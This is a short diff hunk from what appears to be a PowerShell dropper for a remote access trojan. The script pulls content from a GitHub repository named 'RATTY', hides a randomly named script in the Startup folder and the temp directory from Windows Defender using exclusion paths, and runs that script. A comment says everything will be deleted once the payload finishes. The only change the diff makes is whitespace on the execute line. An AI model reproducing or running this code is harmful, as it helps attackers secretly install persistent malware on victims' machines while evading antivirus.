@@ -15,6 +15,6 @@ Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/resou
 # The command disables Windows Defender scheduled and real-time scanning for files in this folder.
 Add-MpPreference -ExclusionPath "C:/Users/$lYIbKdtBmp/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/qjhOmDleBS.ps1"
 Add-MpPreference -ExclusionPath "$env:temp"
- powershell .\qjhOmDleBS.ps1
+powershell .\qjhOmDleBS.ps1
 #after finishing the payload we shall delete every thing
 
